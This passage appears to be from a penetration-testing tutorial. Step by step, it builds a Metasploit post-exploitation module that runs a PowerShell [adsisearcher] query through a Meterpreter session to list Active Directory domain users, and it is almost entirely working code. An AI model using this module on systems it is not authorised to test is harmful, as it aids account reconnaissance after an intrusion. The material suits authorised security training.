Let's build our post-exploitation module.

+   1. First, we need to specify which libraries to load:
+   ```
+   require 'msf/core/post/windows/powershell'
+   ```
+   2. Next, define the class and include PowerShell functionalities in the module:
+   ```
+   class MetasploitModule < Msf::Post
+     include Msf::Post::Windows::Powershell
+   ```
+   3. Then we need to fill in the module information:
+   ```
+   def initialize(info={})
+     super(update_info(info,
+       'Name' => 'PowerShell Domain User Enumeration',
+       'Description' => %q{
+         This module will enumerate user accounts
+         in the default domain using PowerShell.
+       },
+       'License' => MSF_LICENSE,
+       'Author' => [ 'Daniel Teixeira' ],
+       'Platform' => [ 'win'],
+       'SessionTypes' => [ 'meterpreter' ]
+     ))
+   end
+   ```
+   4. For this module, we will use the PowerShell [ads iSearcher] type accelerator to search AD and list all the users:
+   ```
+   user_enum = '([adsisearcher]"objectcategory=user").findall() | foreach {$_.Path} | ForEach-Object { $_.Split("=",)[1]}'
+   ```
+   5. To finish, we just need to use print_status to print the output of the command to the screen:
+   ```
+   print_status psh_exec(user_enum)
+   ```